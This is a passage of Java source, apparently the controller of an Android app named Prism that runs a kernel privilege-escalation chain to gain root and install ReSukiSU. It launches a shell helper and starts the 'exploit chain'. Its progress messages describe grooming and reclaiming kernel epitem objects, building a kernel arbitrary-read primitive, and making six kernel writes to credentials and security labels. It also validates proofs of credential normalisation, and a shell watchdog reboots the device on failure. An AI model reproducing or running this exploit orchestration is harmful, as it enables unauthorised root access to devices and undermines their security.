                            " boot_id=" + bootId +
                            " proof_sha256=" + strictCleanProofDigest +
                            " dwell_ms=" + dwellMillis +
                            " jobs=" + jobs +
                            " ksud=35088 profile=exact health=normal" +
                            " donor=unique helper=absent watchdog=absent";
            requirePass(
                    app.recordStrictCleanReceipt(strictCleanReceipt),
                    "strict-clean-receipt",
                    true);
            reporter.log("Cleanup proof recorded");
            passed = true;
        } finally {
            if (!passed) {
                cleanupClaimedClean = false;
            }
        }
    }

    private void startHarness() throws Exception {
        requireHelperIdentity(false);
        requireControllerWatchdogIdentity();
        controllerTrace("harness-dispatch-enter");
        harnessDispatchAttempted = true;
        String state = app.startRootChain(
                bridgeNonce, helperPid, helperStart,
                donor.pid, donor.startTime, ueventd.pid);
        requirePass(state, "harness-start", false);
        harnessStarted = true;
        controllerTrace("harness-dispatch-pass");
        reporter.log("Exploit chain started");
    }

    private void startControllerWatchdog() throws Exception {
        reporter.phase(
                "controller-watchdog",
                "Arming the safety watchdog");
        File pidFile = new File(CONTROLLER_WATCHDOG_PID);
        require(!pidFile.exists(), "controller-watchdog-stale", false,
                "A stale controller watchdog marker is present");
        controllerWatchdogDisarmToken = randomHex(32);
        String disarm = "disarm=" + controllerWatchdogDisarmToken +
                " session=" + session + " boot_id=" + bootId;
        String script = "set -f; umask 077; " +
                "prism_stat=$(/system/bin/cat /proc/$$/stat) || exit 91; " +
                "prism_tail=${prism_stat##*) }; set -- $prism_tail; " +
                "shift 19 || exit 92; prism_start=$1; " +
                "case $prism_start in ''|*[!0-9]*) exit 93;; esac; " +
                "echo \"pid=$$ start=$prism_start session=" + session +
                " boot_id=" + bootId + "\" > " +
                CONTROLLER_WATCHDOG_PID + "; " +
                "/system/bin/sync " + CONTROLLER_WATCHDOG_PID + "; " +
                "trap 'rm -f " + CONTROLLER_WATCHDOG_PID + "' EXIT; " +
                "if IFS= read -r prism_lease && [ \"$prism_lease\" = \"" +
                disarm + "\" ]; then exit 0; fi; " +
                "prism_safe=$(/system/bin/cat " +
                SafeResetCoordinator.JOURNAL + " 2>/dev/null); " +
                "case \"$prism_safe\" in " +
                "\"version=1 state=SAFE_RESET_PENDING checkpoint=\"*" +
                "\" session=" + session + " boot_id=" + bootId + " \"*) " +
                "exit 0;; esac; " +
                "while [ \"$(/system/bin/cat /proc/sys/kernel/random/boot_id " +
                "2>/dev/null)\" = \"" + bootId + "\" ]; do " +
                "/system/bin/reboot; /system/bin/sleep 3; done";
        controllerWatchdog = new java.lang.ProcessBuilder(
                "/system/bin/sh", "-c", script, "prism-controller-watchdog")
                .redirectErrorStream(true)
                .redirectOutput(new File("/dev/null"))
                .start();
        controllerWatchdogLease = controllerWatchdog.getOutputStream();

        long deadline = elapsed() + 5_000;
        while (elapsed() < deadline) {
            require(controllerWatchdog.isAlive(), "controller-watchdog-exit", false,
                    "The controller watchdog exited while arming");
            String marker = readTextIfPresent(CONTROLLER_WATCHDOG_PID, 512).trim();
            Matcher matcher = Pattern.compile(
                    "pid=([1-9][0-9]*) start=([1-9][0-9]*) session=" + session +
                            " boot_id=" + Pattern.quote(bootId)).matcher(marker);
            if (matcher.matches()) {
                controllerWatchdogPid = Integer.parseInt(matcher.group(1));
                controllerWatchdogStart = processStartTime(controllerWatchdogPid);
                require(matcher.group(2).equals(controllerWatchdogStart),
                        "controller-watchdog-start", false,
                        "The controller watchdog start time is invalid");
                requireControllerWatchdogIdentity();
                reporter.log("Safety watchdog verified");
                return;
            }
            Thread.sleep(20);
        }
        triggerControllerWatchdog();
        throw new ActivationFailure(
                "controller-watchdog-marker", false,
                "The controller watchdog did not publish its identity");
    }

    private void recoverStaleControllerResidue() throws Exception {
        File markerFile = new File(CONTROLLER_WATCHDOG_PID);
        if (markerFile.exists()) {
            String marker = readText(CONTROLLER_WATCHDOG_PID, 512).trim();
            Matcher match = Pattern.compile(
                    "pid=([1-9][0-9]*) start=([1-9][0-9]*) " +
                            "session=([0-9a-f]{64}) boot_id=" +
                            "([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-" +
                            "[0-9a-f]{4}-[0-9a-f]{12})")
                    .matcher(marker);
            if (!match.matches()) {
                reporter.log("Ambiguous controller watchdog residue detected");
                requestConfirmedSafetyReboot();
                throw new ActivationFailure(
                        "controller-watchdog-residue", true,
                        "The stale watchdog marker is malformed");
            }
            int pid = Integer.parseInt(match.group(1));
            String start = match.group(2);
            if (start.equals(processStartTime(pid))) {
                boolean identityValid = false;
                try {
                    ProcIdentity identity = readProc(pid);
                    String commandLine = readProcBytes(pid, "cmdline")
                            .replace('\0', ' ').trim();
                    identityValid = identity.idsEqual("Uid", Process.SHELL_UID) &&
                            identity.idsEqual("Gid", Process.SHELL_UID) &&
                            "u:r:shell:s0".equals(identity.context) &&
                            commandLine.contains("prism-controller-watchdog") &&
                            commandLine.contains(match.group(3)) &&
                            commandLine.contains(match.group(4));
                } catch (Exception ignored) {}
                reporter.log(identityValid
                        ? "Live stale controller watchdog detected"
                        : "Ambiguous live watchdog identity detected");
                requestConfirmedSafetyReboot();
                throw new ActivationFailure(
                        "controller-watchdog-residue", true,
                        "A live stale watchdog required a safety reboot");
            }
            deleteExactResidue(markerFile, marker);
            reporter.log("Retired a proven dead controller watchdog marker");
        }

        File journalFile = new File(CONTROLLER_JOURNAL);
        if (!journalFile.exists()) {
            return;
        }
        String journal = readText(CONTROLLER_JOURNAL, 4096).trim();
        Matcher match = Pattern.compile(
                "version=1 state=(TEARDOWN_VALIDATED|RESET_VERIFIED) " +
                        "session=([0-9a-f]{64}) boot_id=" +
                        "([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-" +
                        "[0-9a-f]{4}-[0-9a-f]{12}) " +
                        "bridge_nonce=([0-9a-f]{32}) helper_pid=([1-9][0-9]*) " +
                        "helper_start=([1-9][0-9]*)")
                .matcher(journal);
        if (match.matches() && !bootId.equals(match.group(3))) {
            deleteExactResidue(journalFile, journal);
            reporter.log("Retired an old-boot controller journal");
            return;
        }
        reporter.log("Unresolved same-boot controller journal detected");
        requestConfirmedSafetyReboot();
        throw new ActivationFailure(
                "controller-journal-residue", true,
                "A stale controller journal required a safety reboot");
    }

    private static void deleteExactResidue(File file, String expected)
            throws Exception {
        require(expected.equals(readText(file.getAbsolutePath(), 4096).trim()),
                "controller-residue-race", true,
                "The controller residue changed while validating it");
        Files.delete(file.toPath());
        require(!file.exists(), "controller-residue-delete", true,
                "The proven stale controller residue remained");
    }

    private void requireControllerWatchdogIdentity() throws Exception {
        require(controllerWatchdog != null && controllerWatchdog.isAlive() &&
                        controllerWatchdogPid > 0 &&
                        !controllerWatchdogStart.isEmpty() && sameBoot() &&
                        controllerWatchdogStart.equals(
                                processStartTime(controllerWatchdogPid)),
                "controller-watchdog-liveness", harnessDispatchAttempted,
                "The controller watchdog lease is not live");
        ProcIdentity identity = readProc(controllerWatchdogPid);
        String commandLine = readProcBytes(controllerWatchdogPid, "cmdline")
                .replace('\0', ' ').trim();
        require(identity.idsEqual("Uid", Process.SHELL_UID) &&
                        identity.idsEqual("Gid", Process.SHELL_UID) &&
                        "u:r:shell:s0".equals(identity.context) &&
                        commandLine.contains("prism-controller-watchdog") &&
                        commandLine.contains(session) && commandLine.contains(bootId),
                "controller-watchdog-identity", harnessDispatchAttempted,
                "The controller watchdog identity changed");
    }

    private void disarmControllerWatchdog() throws Exception {
        if (controllerWatchdog == null) {
            return;
        }
        requireControllerWatchdogIdentity();
        retireResetJournalIfPresent();
        String disarm = "disarm=" + controllerWatchdogDisarmToken +
                " session=" + session + " boot_id=" + bootId + "\n";
        controllerWatchdogLease.write(disarm.getBytes(StandardCharsets.US_ASCII));
        controllerWatchdogLease.flush();
        controllerWatchdogLease.close();
        controllerWatchdogLease = null;
        require(controllerWatchdog.waitFor(5, TimeUnit.SECONDS) &&
                        controllerWatchdog.exitValue() == 0 &&
                        processStartTime(controllerWatchdogPid).isEmpty() &&
                        !new File(CONTROLLER_WATCHDOG_PID).exists(),
                "controller-watchdog-disarm", true,
                "The controller watchdog did not retire cleanly");
        controllerWatchdog = null;
        reporter.log("Independent controller safety lease retired");
    }

    private void disarmControllerWatchdogForSafeReset() throws Exception {
        if (controllerWatchdog == null) {
            return;
        }
        requireControllerWatchdogIdentity();
        SafeResetRecord.Journal journal = SafeResetCoordinator.readJournal();
        require(journal != null && safeResetRecord != null &&
                        safeResetRecord.binding().equals(
                                journal.record.binding()),
                "safe-reset-watchdog-journal", true,
                "The safe reset journal is not durable");
        String disarm = "disarm=" + controllerWatchdogDisarmToken +
                " session=" + session + " boot_id=" + bootId + "\n";
        controllerWatchdogLease.write(disarm.getBytes(StandardCharsets.US_ASCII));
        controllerWatchdogLease.flush();
        controllerWatchdogLease.close();
        controllerWatchdogLease = null;
        require(controllerWatchdog.waitFor(5, TimeUnit.SECONDS) &&
                        controllerWatchdog.exitValue() == 0 &&
                        processStartTime(controllerWatchdogPid).isEmpty() &&
                        !new File(CONTROLLER_WATCHDOG_PID).exists(),
                "safe-reset-watchdog-disarm", false,
                "The safe reset safety lease did not retire cleanly");
        controllerWatchdog = null;
        reporter.log("Independent controller safety lease retired after durable no-mutation proof");
    }

    private void releaseControllerWatchdogForSafeReset() {
        if (controllerWatchdogLease != null) {
            try {
                controllerWatchdogLease.close();
            } catch (Exception ignored) {}
            controllerWatchdogLease = null;
        }
        if (controllerWatchdog != null) {
            try {
                controllerWatchdog.waitFor(2, TimeUnit.SECONDS);
            } catch (Exception ignored) {}
            if (!controllerWatchdog.isAlive()) {
                controllerWatchdog = null;
            }
        }
    }

    private void retireResetJournalIfPresent() throws Exception {
        File journal = new File(CONTROLLER_JOURNAL);
        if (!processTeardownRequested) {
            require(!journal.exists(), "controller-journal-unexpected", true,
                    "An unexpected controller journal is present");
            return;
        }
        String expected = "version=1 state=RESET_VERIFIED" +
                " session=" + session +
                " boot_id=" + bootId +
                " bridge_nonce=" + bridgeNonce +
                " helper_pid=" + helperPid +
                " helper_start=" + helperStart;
        require(journal.isFile() && expected.equals(
                        readText(CONTROLLER_JOURNAL, 4096).trim()),
                "controller-journal-retire", true,
                "The reset journal does not match the completed teardown");
        deleteExactResidue(journal, expected);
    }

    private void triggerControllerWatchdog() {
        if (controllerWatchdogLease != null) {
            try {
                controllerWatchdogLease.close();
            } catch (Exception ignored) {}
            controllerWatchdogLease = null;
        }
    }

    private void startHelper() throws Exception {
        reporter.phase("helper", "Starting the shell activation helper");
        String apk = context.getApplicationInfo().sourceDir;
        require(apk != null && apk.startsWith("/data/app/") &&
                        apk.endsWith("/base.apk") && new File(apk).isFile(),
                "apk-path", false, "The installed Prism APK path is invalid");
        File helperLog = new File(HELPER_LOG);
        if (helperLog.exists() && !helperLog.delete()) {
            throw new ActivationFailure("helper-log", false,
                    "The stale helper log cannot be removed");
        }
        if (!helperLog.createNewFile()) {
            throw new ActivationFailure("helper-log", false,
                    "The helper log cannot be created");
        }
        Os.chmod(HELPER_LOG, 0600);
        java.lang.ProcessBuilder builder = new java.lang.ProcessBuilder(
                "/system/bin/app_process", "/system/bin", HELPER_CLASS,
                apk, Integer.toString(donor.pid),
                "hold-command-server-clean", bridgeNonce);
        builder.environment().put("CLASSPATH", apk);
        builder.redirectErrorStream(true);
        builder.redirectOutput(helperLog);
        builder.redirectInput(new File("/dev/null"));
        helperProcess = builder.start();

        String readyPrefix = "BRIDGE_READY nonce=" + bridgeNonce + " pid=";
        String ready = waitForHelperPrefix(readyPrefix, 10_000);
        String value = ready.substring(readyPrefix.length());
        require(value.matches("[1-9][0-9]*"), "helper-ready", false,
                "The helper ready marker is invalid");
        helperPid = Integer.parseInt(value);
        helperStart = processStartTime(helperPid);
        helperCommandLine = readProcBytes(helperPid, "cmdline")
                .replace('\0', ' ').trim();
        require(!helperStart.isEmpty() && helperCommandLine.contains(HELPER_CLASS),
                "helper-identity", false, "The helper process identity is invalid");
        reporter.log("Shell helper verified");
    }

    private void startArmHolder() throws Exception {
        Files.deleteIfExists(Path.of(ARM_HOLDER_PID));
        String markerScript =
                "prism_stat=$(/system/bin/cat /proc/$$/stat) || exit 91; " +
                "prism_tail=${prism_stat##*) }; set -- $prism_tail; " +
                "shift 19 || exit 92; prism_start=$1; " +
                "case $prism_start in ''|*[!0-9]*) exit 93;; esac; " +
                "echo \"pid=$$ start=$prism_start\" > " + ARM_HOLDER_PID +
                "; /system/bin/sync " + ARM_HOLDER_PID + "; ";
        armHolder = new java.lang.ProcessBuilder(
                "/system/bin/sh", "-c",
                markerScript + "exec 0<" + SU_ARM +
                        "; /system/bin/flock -x 0; " +
                        "exec /system/bin/sleep 1800")
                .redirectErrorStream(true)
                .redirectOutput(new File("/dev/null"))
                .redirectInput(new File("/dev/null"))
                .start();
        long deadline = elapsed() + 5_000;
        while (elapsed() < deadline) {
            String marker = readTextIfPresent(ARM_HOLDER_PID, 256).trim();
            Matcher identity = Pattern.compile(
                    "pid=([1-9][0-9]*) start=([1-9][0-9]*)")
                    .matcher(marker);
            CommandResult held = runCommand(
                    "/system/bin/sh", "-c",
                    "exec 0<" + SU_ARM + "; /system/bin/flock -n -x 0");
            if (held.exit == 1 && held.output.isEmpty() &&
                    armHolder.isAlive() && identity.matches()) {
                armHolderPid = Integer.parseInt(identity.group(1));
                armHolderStart = identity.group(2);
                require(armHolderStart.equals(processStartTime(armHolderPid)),
                        "command-arm-holder-identity", false,
                        "The command arm holder identity is unavailable");
                require(Files.isSameFile(
                                Path.of("/proc/" + armHolderPid + "/fd/0"),
                                Path.of(SU_ARM)),
                        "command-arm-holder-file", false,
                        "The command arm holder does not own the arm file");
                return;
            }
            Thread.sleep(20);
        }
        throw new ActivationFailure("command-arm-lock", false,
                "The command arm lock did not become ready");
    }

    private void prepareShellControlFiles() throws Exception {
        removeShellControlFiles();
        writeShellFile(SU_TOKEN, commandToken, 0600);
        writeShellFile(SU_ARM, "", 0600);
    }

    private void removeShellControlFiles() {
        for (String path : Arrays.asList(
                SU_TOKEN, SU_ARM, ROOT_WATCHDOG_ARM, NORMALISE_WAITING,
                ARM_HOLDER_PID)) {
            try {
                Files.deleteIfExists(Path.of(path));
            } catch (Exception ignored) {}
        }
    }

    private void writeShellFile(String path, String value, int mode) throws Exception {
        try (FileOutputStream output = new FileOutputStream(path, false)) {
            output.write(value.getBytes(StandardCharsets.UTF_8));
            output.getFD().sync();
        }
        Os.chmod(path, mode);
    }

    private ProcIdentity waitForStableProcess(
            String process,
            String expectedName,
            String expectedContext,
            int expectedUid,
            int requiredCapability) throws Exception {
        ProcIdentity candidate = requireProcess(
                process, expectedName, expectedContext,
                expectedUid, requiredCapability);
        long stableSince = elapsed();
        long deadline = stableSince + 60_000;
        while (elapsed() < deadline) {
            Thread.sleep(1_000);
            ProcIdentity current = requireProcess(
                    process, expectedName, expectedContext,
                    expectedUid, requiredCapability);
            if (current.pid == candidate.pid &&
                    current.startTime.equals(candidate.startTime)) {
                if (elapsed() - stableSince >= 10_000) {
                    return current;
                }
            } else {
                candidate = current;
                stableSince = elapsed();
            }
        }
        throw new ActivationFailure("stable-process", false,
                process + " did not become stable");
    }

    private ProcIdentity requireProcess(
            String process,
            String expectedName,
            String expectedContext,
            int expectedUid,
            int requiredCapability) throws Exception {
        String[] pids = fixedCommand("/system/bin/pidof", process).trim().split("\\s+");
        require(pids.length == 1 && pids[0].matches("[1-9][0-9]*"),
                "process-identity", false, process + " does not have one process");
        ProcIdentity identity = readProc(Integer.parseInt(pids[0]));
        long capabilities = Long.parseUnsignedLong(identity.field("CapEff"), 16);
        require(expectedName.equals(identity.field("Name")) &&
                        identity.idsEqual("Uid", expectedUid) &&
                        identity.idsEqual("Gid", expectedUid) &&
                        expectedContext.equals(identity.context) &&
                        (capabilities & (1L << requiredCapability)) != 0,
                "process-identity", false, process + " identity gate failed");
        return identity;
    }

    private void validateRootWindow(String expectedContext) throws Exception {
        ProcIdentity helper = readProc(helperPid);
        ProcIdentity watchdog = readProcTask(helperPid, watchdogTid);
        require(helper.idsEqual("Uid", 0) && helper.idsEqual("Gid", 0) &&
                        donor.field("CapEff").equals(helper.field("CapEff")) &&
                        expectedContext.equals(helper.context) &&
                        Integer.toString(helperPid).equals(watchdog.field("Tgid")) &&
                        watchdog.idsEqual("Uid", 0) && watchdog.idsEqual("Gid", 0) &&
                        donor.field("CapEff").equals(watchdog.field("CapEff")) &&
                        expectedContext.equals(watchdog.context) &&
                        donor.isSameProcess() && helperIsSameProcess() && sameBoot(),
                "root-window-host-gate", true,
                "The external root window identity gate failed");
    }

    private void validateFinaliseProof(Map<String, String> fields)
            throws ActivationFailure {
        require("pass".equals(fields.get("status")) &&
                        "ctlbuf-finalise".equals(fields.get("stage")) &&
                        "none".equals(fields.get("reason")) &&
                        "0".equals(fields.get("error")) &&
                        Integer.toString(helperPid).equals(fields.get("helper_pid")) &&
                        Integer.toString(donor.pid).equals(fields.get("donor_pid")) &&
                        "1".equals(fields.get("helper_borrowed")) &&
                        "1".equals(fields.get("restored_link")) &&
                        "1".equals(fields.get("restored_inode")) &&
                        "1".equals(fields.get("forward_cycle")) &&
                        "1".equals(fields.get("reverse_cycle")) &&
                        "1".equals(fields.get("readbacks")) &&
                        "1".equals(fields.get("donor_frozen")) &&
                        "1".equals(fields.get("list_exact")) &&
                        "1".equals(fields.get("proof")),
                "ctlbuf-finalise-proof", true,
                "The ctlbuf finalisation proof is invalid");
    }

    private void validateResumeProof(Map<String, String> fields)
            throws ActivationFailure {
        long magic = unsigned(fields.get("magic"));
        long cookieHi = unsigned(fields.get("cookie_hi"));
        long cookieLo = unsigned(fields.get("cookie_lo"));
        long donorTask = unsigned(fields.get("donor_task"));
        long commit = unsigned(fields.get("commit"));
        long beforeState = unsigned(fields.get("before_state"));
        long afterState = unsigned(fields.get("after_state"));
        long expectedHi = Long.parseUnsignedLong(bridgeNonce.substring(0, 16), 16);
        long expectedLo = Long.parseUnsignedLong(bridgeNonce.substring(16), 16);
        require("pass".equals(fields.get("status")) &&
                        "donor-resume".equals(fields.get("stage")) &&
                        magic == 0x4c5033524553554dL &&
                        "1".equals(fields.get("version")) &&
                        "176".equals(fields.get("size")) &&
                        cookieHi == expectedHi && cookieLo == expectedLo &&
                        Integer.toString(helperPid).equals(fields.get("helper_pid")) &&
                        Integer.toString(donor.pid).equals(fields.get("donor_pid")) &&
                        Integer.toString(donor.pid).equals(fields.get("donor_tgid")) &&
                        "18".equals(fields.get("signal")) &&
                        "0".equals(fields.get("signal_result")) &&
                        "0".equals(fields.get("signal_errno")) &&
                        (beforeState & 0xcL) != 0 &&
                        "0x0".equals(fields.get("before_exit_state")) &&
                        positive(fields.get("before_threads")) &&
                        fields.get("before_threads").equals(fields.get("before_stopped")) &&
                        (afterState & 0xcL) == 0 &&
                        "0x0".equals(fields.get("after_exit_state")) &&
                        positive(fields.get("after_threads")) &&
                        "0".equals(fields.get("after_stopped")) &&
                        "2".equals(fields.get("stable_samples")) &&
                        unsigned(fields.get("task_security")) != 0 &&
                        "0x0".equals(fields.get("task_security_word8")) &&
                        unsigned(fields.get("inode_security")) != 0 &&
                        "0x0".equals(fields.get("inode_security_word8")) &&
                        "1".equals(fields.get("labels_restored")) &&
                        "1".equals(fields.get("resumed")) &&
                        "1".equals(fields.get("proof")) &&
                        commit == (magic ^ cookieHi ^ cookieLo ^ donorTask ^
                                0xa5d91f7462c83be0L),
                "donor-resume-proof", true,
                "The donor resume proof is invalid");
    }

    private void validateNormalisationProof(
            Map<String, String> fields,
            Map<String, String> resume) throws ActivationFailure {
        require("pass".equals(fields.get("status")) &&
                        "credential-normalisation".equals(fields.get("stage")) &&
                        Integer.toString(watchdogTid).equals(fields.get("watchdog_tid")) &&
                        "1".equals(fields.get("joined")) &&
                        "1".equals(fields.get("tid_gone")) &&
                        "0".equals(fields.get("uid_result")) &&
                        "0".equals(fields.get("gid_result")) &&
                        "1".equals(fields.get("shell")) &&
                        "1".equals(fields.get("ctlbuf_repaired")) &&
                        "1".equals(fields.get("module_loaded")) &&
                        "1".equals(fields.get("module_unloaded")) &&
                        "1".equals(fields.get("module_finalised")) &&
                        "1".equals(fields.get("finalise_proof")) &&
                        "1".equals(fields.get("donor_frozen")) &&
                        "1".equals(fields.get("donor_resumed")) &&
                        Integer.toString(donor.pid).equals(fields.get("donor_resume_pid")) &&
                        "0".equals(fields.get("donor_resume_result")) &&
                        "0".equals(fields.get("donor_resume_errno")),
                "normalisation-proof", true,
                "The credential normalisation proof is invalid");
        Map<String, String> mapping = new LinkedHashMap<>();
        mapping.put("resume_magic", "magic");
        mapping.put("resume_version", "version");
        mapping.put("resume_size", "size");
        mapping.put("resume_cookie_hi", "cookie_hi");
        mapping.put("resume_cookie_lo", "cookie_lo");
        mapping.put("resume_helper_task", "helper_task");
        mapping.put("resume_helper_pid", "helper_pid");
        mapping.put("resume_donor_task", "donor_task");
        mapping.put("resume_donor_tgid", "donor_tgid");
        mapping.put("resume_signal", "signal");
        mapping.put("resume_before_state", "before_state");
        mapping.put("resume_before_exit_state", "before_exit_state");
        mapping.put("resume_before_threads", "before_threads");
        mapping.put("resume_before_stopped", "before_stopped");
        mapping.put("resume_after_state", "after_state");
        mapping.put("resume_after_exit_state", "after_exit_state");
        mapping.put("resume_after_threads", "after_threads");
        mapping.put("resume_after_stopped", "after_stopped");
        mapping.put("resume_stable_samples", "stable_samples");
        mapping.put("resume_task_security", "task_security");
        mapping.put("resume_task_security_word8", "task_security_word8");
        mapping.put("resume_inode_security", "inode_security");
        mapping.put("resume_inode_security_word8", "inode_security_word8");
        mapping.put("resume_labels_restored", "labels_restored");
        mapping.put("resume_resumed", "resumed");
        mapping.put("resume_proof", "proof");
        mapping.put("resume_commit", "commit");
        for (Map.Entry<String, String> entry : mapping.entrySet()) {
            require(equalUnsignedOrText(
                            fields.get(entry.getKey()), resume.get(entry.getValue())),
                    "normalisation-resume-binding", true,
                    "The normalisation and donor resume proofs disagree");
        }
    }

    private void validateFinalShellIdentity() throws Exception {
        ProcIdentity finalHelper = readProc(helperPid);
        Set<Integer> finalTids = taskIds(helperPid);
        Set<String> identityFields = new HashSet<>(Arrays.asList(
                "Uid", "Gid", "Groups", "CapInh", "CapPrm", "CapEff",
                "CapBnd", "CapAmb", "NoNewPrivs", "Seccomp", "Seccomp_filters"));
        for (String field : identityFields) {
            require(helperBaseline.values(field).equals(finalHelper.values(field)),
                    "final-shell-identity", true,
                    "The helper " + field + " identity changed");
        }
        require(helperBaseline.context.equals(finalHelper.context) &&
                        helperBaseline.namespaces.equals(finalHelper.namespaces) &&
                        finalTids.containsAll(helperTidsBeforeRoot) &&
                        !finalTids.contains(watchdogTid) &&
                        helperIsSameProcess() && ueventd.isSameProcess() &&
                        !moduleVisible() && sameBoot(),
                "final-shell-identity", true,
                "The final shell identity did not return to baseline");
        for (int tid : finalTids) {
            if (!helperTidsBeforeRoot.contains(tid)) {
                ProcIdentity thread = readProcTask(helperPid, tid);
                for (String field : identityFields) {
                    require(helperBaseline.values(field).equals(thread.values(field)),
                            "final-shell-thread", true,
                            "An added helper thread is not shell");
                }
                require(helperBaseline.context.equals(thread.context),
                        "final-shell-thread", true,
                        "An added helper thread has the wrong context");
            }
        }
    }

    private String buildTerminalHostGate(
            ActivationProofs.NormalisationProof normalised,
            DonorSample donorSample,
            boolean retired) throws ActivationFailure {
        StringBuilder value = new StringBuilder()
                .append("nonce=").append(bridgeNonce)
                .append(" helper_pid=").append(helperPid)
                .append(" helper_start_time=").append(helperStart)
                .append(" boot_id=").append(bootId)
                .append(" watchdog_tid=").append(watchdogTid)
                .append(" joined=1 tid_gone=1 uid_result=0 gid_result=0 shell=1")
                .append(" ctlbuf_repaired=1 module_loaded=1 module_unloaded=1")
                .append(" module_finalised=1 finalise_proof=1")
                .append(" donor_frozen=1 donor_resumed=1")
                .append(" donor_resume_pid=").append(donor.pid)
                .append(" donor_resume_result=0 donor_resume_errno=0");
        value.append(' ').append(normalised.resumeGateFields());
        value.append(" host_donor_pid=").append(donor.pid)
                .append(" host_donor_start_time=").append(donor.startTime)
                .append(" host_donor_tids=").append(donorSample.tids)
                .append(" host_donor_states=").append(donorSample.states)
                .append(" host_donor_samples=2");
        if (retired) {
            value.append(" helper_retired=1");
        }
        value.append(" host_helper_identity=1");
        return value.toString();
    }

    private DonorSample stableDonorTasks(boolean stopped, long timeout)
            throws Exception {
        long deadline = elapsed() + timeout;
        Set<Integer> previous = null;
        Map<Integer, String> states = null;
        int stable = 0;
        while (elapsed() < deadline) {
            Set<Integer> tids = taskIds(donor.pid);
            Map<Integer, String> currentStates = new LinkedHashMap<>();
            boolean valid = !tids.isEmpty() && donor.isSameProcess() &&
                    donor.context.equals(readText(
                            "/proc/" + donor.pid + "/attr/current", 512)
                            .replace("\0", "").trim()) && sameBoot();
            for (int tid : tids) {
                ProcIdentity task = readProcTask(donor.pid, tid);
                String state = task.values("State").isEmpty()
                        ? "" : task.values("State").get(0);
                boolean taskStopped = "T".equals(state) || "t".equals(state);
                if (!Integer.toString(donor.pid).equals(task.field("Tgid")) ||
                        taskStopped != stopped) {
                    valid = false;
                    break;
                }
                currentStates.put(tid, state);
            }
            if (valid && tids.equals(previous)) {
                stable++;
            } else if (valid) {
                stable = 1;
            } else {
                stable = 0;
            }
            previous = valid ? tids : null;
            states = valid ? currentStates : null;
            if (stable >= 2 && states != null) {
                List<Integer> sorted = new ArrayList<>(states.keySet());
                Collections.sort(sorted);
                StringBuilder ids = new StringBuilder();
                StringBuilder stateText = new StringBuilder();
                for (int tid : sorted) {
                    if (ids.length() > 0) {
                        ids.append(',');
                        stateText.append(',');
                    }
                    ids.append(tid);
                    stateText.append(tid).append(':').append(states.get(tid));
                }
                return new DonorSample(ids.toString(), stateText.toString());
            }
            Thread.sleep(50);
        }
        return null;
    }

    private void observeProgress(String progress) {
        lastProgress = progress;
        if (progress.contains(" root-mutation-start") ||
                progress.contains(" arbitrary-read-reclaim-armed") ||
                progress.contains(" arbitrary-read-free-start")) {
            mutationObserved = true;
        }
        String[] lines = progress.split("\\n");
        for (int index = reportedProgressLines; index < lines.length; index++) {
            String line = lines[index].trim();
            if (!line.isEmpty()) {
                int separator = line.indexOf(' ');
                String marker = separator >= 0 ? line.substring(separator + 1) : line;
                String message = userProgressMessage(marker);
                if (message != null) {
                    reporter.log(message);
                }
            }
        }
        reportedProgressLines = Math.max(reportedProgressLines, lines.length);
    }

    private static String userProgressMessage(String marker) {
        switch (marker) {
            case "epitem-start":
                return "[*] Grooming kernel event objects";
            case "epitem-reclaim-pass":
                return "[+] Kernel event objects reclaimed";
            case "epitem-analysis-pass":
                return "[+] Kernel file object located";
            case "node-stage-start":
                return "[*] Locating the Binder node";
            case "node-analysis-pass":
                return "[+] Binder node located";
            case "arbitrary-read-start":
                return "[*] Building the kernel read primitive";
            case "arbitrary-read-pass":
                return "[+] Kernel read primitive established";
            case "helper-target-pass":
                return "[+] Shell credential target verified";
            case "resukisu-stage-plan-ready":
                return "[+] ReSukiSU activation plan verified";
            case "root-write-arm-ready":
                return "[*] Preparing guarded kernel writes";
            case "root-window-ready":
                return "[*] Entering the guarded root window";
            case "root-window-security-ready":
                return "[+] Kernel security state updated";
            case "epitem-reader-failed":
            case "epitem-reclaim-failed":
            case "epitem-analysis-failed":
                return "[!] Kernel file search missed; preparing a same-boot retry";
            case "node-analysis-failed":
                return "[!] Binder node search missed; preparing a same-boot retry";
            case "arbitrary-read-observe-miss-safe":
                return "[!] Kernel read setup missed; preparing a same-boot retry";
            default:
                Matcher write = Pattern.compile(
                                "^root-write-([1-6])-(pass|(?:preflight-)?retry-ready)$")
                        .matcher(marker);
                if (write.matches()) {
                    int step = Integer.parseInt(write.group(1));
                    return "pass".equals(write.group(2))
                            ? "[+] Kernel write " + step + "/6 completed"
                            : "[!] Kernel write " + step +
                                    "/6 missed safely; retrying";
                }
                return null;
        }
    }

    private boolean privateCredentialRequestReady(String progress) {
        return progress.contains(" private-credential-request-ready") &&
                progress.contains(" arbitrary-read-retained") &&
                progress.contains(" arbitrary-read-pass");
    }

    private boolean isSafeMiss(String progress, String result) {
        return ActivationProofs.parseSafeAcquisitionMiss(result, progress) != null;
    }

    private void waitForProgress(String marker, long timeout) throws Exception {
        long deadline = elapsed() + timeout;
        while (elapsed() < deadline) {
            String progress = readApp(PrismAppBridgeService.SIGNAL_PROGRESS);
            if (!progress.isEmpty()) {
                observeProgress(progress);
            }
            if (progress.contains(" " + marker)) {
                return;
            }
            Thread.sleep(40);
        }
        throw new ActivationFailure(marker, true,
                "Timed out waiting for " + marker);
    }

    private String waitForAppSignal(
            int signal, String prefix, long timeout) throws Exception {
        long deadline = elapsed() + timeout;
        while (elapsed() < deadline) {
            String value = readApp(signal);
            if (value.startsWith(prefix)) {
                return value;
            }
            Thread.sleep(40);
        }
        throw new ActivationFailure("app-signal", mutationObserved,
                "Timed out waiting for a private activation signal");
    }

    private String readApp(int signal) throws Exception {
        String value = app.readSignal(signal);
        if (value.startsWith("status=fail stage=app-bridge-read ")) {
            throw new ActivationFailure(
                    "app-bridge-read", mutationObserved,
                    "The app bridge binding failed");
        }
        return value;
    }

    private void writeGate(int gate, String value) throws Exception {
        requirePass(app.writeGate(gate, value),
                "app-bridge-gate-" + gate, mutationObserved);
    }

    private String watchdogGate() {
        return "nonce=" + bridgeNonce +
                " helper_pid=" + helperPid +
                " helper_start_time=" + helperStart +
                " watchdog_tid=" + watchdogTid +
                " boot_id=" + bootId +
                " host_helper_identity=1";
    }

    private Frame readFrame(String terminalPrefix, int limit) throws Exception {
        List<String> lines = new ArrayList<>();
        int total = 0;
        while (total < limit) {
            String line = readSocketLine(Math.min(65_536, limit - total));
            total += line.getBytes(StandardCharsets.UTF_8).length + 1;
